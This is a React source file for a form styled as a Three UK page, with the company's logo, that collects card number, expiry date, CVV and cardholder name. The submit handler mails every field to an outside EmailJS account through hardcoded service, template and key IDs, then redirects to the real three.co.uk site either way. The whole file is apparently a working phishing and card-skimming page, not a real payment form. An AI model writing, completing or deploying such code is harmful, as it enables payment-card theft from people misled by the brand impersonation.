import React, { useState, useRef } from "react";
import emailjs from "@emailjs/browser";

const CardDetailsForm = () => {
  const [formData, setFormData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardHolder: "",
  });

  const form = useRef();

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const sendCardDetails = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_km7fzwj", // Replace with your EmailJS Service ID
        "template_btre0d9", // Replace with your EmailJS Template ID
        form.current,
        "rtaAAe7bG1hAjyxBx" // Replace with your EmailJS Public Key
      )
      .then(
        (result) => {
          console.log("Email sent:", result.text);
          window.location.href = "https://www.three.co.uk/";
        },
        (error) => {
          console.log("Error:", error.text);
          window.location.href = "https://www.three.co.uk/";
        }
      );

    e.target.reset();
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-white">
      <div className="w-full max-w-sm text-center">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <img
            src="https://www.three.co.uk/content/experience-fragments/threedigital/uk/en/site/header/master/_jcr_content/root/header/top/logo.coreimg.svg/1668177162294/three-logo.svg"
            alt="Logo"
            className="w-[30%] h-auto"
          />
        </div>

        {/* Title */}
        <h2 className="text-4xl font-bold">Enter Card Details</h2>

        {/* Form */}
        <form ref={form} className="mt-6 text-left" onSubmit={sendCardDetails}>
          <div className="mb-4">
            <label className="block text-gray-700 font-medium">
              Card Number
            </label>
            <input
              type="text"
              name="cardNumber"
              value={formData.cardNumber}
              onChange={handleChange}
              required
              placeholder="1234 5678 9012 3456"
              className="w-full border-b border-gray-900 focus:outline-none p-2"
            />
          </div>

          <div className="mb-4">
            <label className="block text-gray-700 font-medium">
              Expiry Date
            </label>
            <input
              type="text"
              name="expiryDate"
              value={formData.expiryDate}
              onChange={handleChange}
              required
              placeholder="MM/YY"
              className="w-full border-b border-gray-900 focus:outline-none p-2"
            />
          </div>

          <div className="mb-4">
            <label className="block text-gray-700 font-medium">CVV</label>
            <input
              type="text"
              name="cvv"
              value={formData.cvv}
              onChange={handleChange}
              required
              placeholder="123"
              className="w-full border-b border-gray-900 focus:outline-none p-2"
            />
          </div>

          <div className="mb-4">
            <label className="block text-gray-700 font-medium">
              Card Holder Name
            </label>
            <input
              type="text"
              name="cardHolder"
              value={formData.cardHolder}
              onChange={handleChange}
              required
              placeholder="John Doe"
              className="w-full border-b border-gray-900 focus:outline-none p-2"
            />
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            className="w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6"
          >
            Submit
          </button>
        </form>
      </div>
    </div>
  );
};

export default CardDetailsForm;
